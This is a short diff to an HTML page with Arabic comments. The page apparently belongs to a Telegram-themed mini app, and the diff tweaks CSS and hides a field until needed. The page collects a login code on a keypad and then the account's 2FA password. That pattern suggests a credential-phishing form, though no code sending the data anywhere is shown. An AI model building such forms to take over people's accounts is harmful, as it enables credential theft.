@@ -103,16 +103,15 @@
             box-sizing: border-box;
             outline: none;
             text-align: center;
-            direction: ltr; /* لضمان كتابة الأرقام وزر الـ + بشكل صحيح */
+            direction: ltr;
         }
 
-        /* لوحة الأرقام مضبوطة باتجاه LTR لضمان ترتيب 1, 2, 3 نظامياً */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-bottom: 14px;
-            direction: ltr; 
+            direction: ltr;
         }
 
         .key-btn {
@@ -166,6 +165,10 @@
 
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none !important;
         }
 
         .error {
@@ -246,6 +249,7 @@
                 <button class="key-btn" onclick="deleteKey('code')">⌫</button>
             </div>
             
+            <!-- خانة كلمة المرور مخفية تماماً بالبداية -->
             <div id="password-group" class="input-group hidden" style="margin-top: 14px;">
                 <label style="color: var(--tg-link-color); text-align: right;">كلمة مرور الحساب (2FA)</label>
                 <input type="password" id="password" placeholder="أدخل كلمة المرور الخاصة بك" style="text-align: right; direction: rtl;">
